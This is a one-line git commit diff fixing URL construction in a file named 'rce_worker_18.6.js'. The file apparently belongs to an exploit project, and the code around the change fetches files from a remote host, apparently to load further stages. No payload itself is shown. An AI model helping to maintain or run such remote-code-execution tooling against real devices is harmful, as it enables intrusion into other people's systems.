9eff087cb1765dfec1769834592110e05ce16946
Guava <guava@openclaw>
2026-04-18 22:24:35 +0800

    fix double slash in URL path

--- DarKSward-main/rce_worker_18.6.js
+++ DarKSward-main/rce_worker_18.6.js
@@ -27,7 +27,7 @@ function print(x, reportError = false, dumphex = false) {
       try 
       {
           let url = "";
-          url = host + "/" + fname;
+          url = host + fname;
           print("trying to fetch from:" + url);
           let xhr = new XMLHttpRequest();
           xhr.open("GET", `${url}` , false);
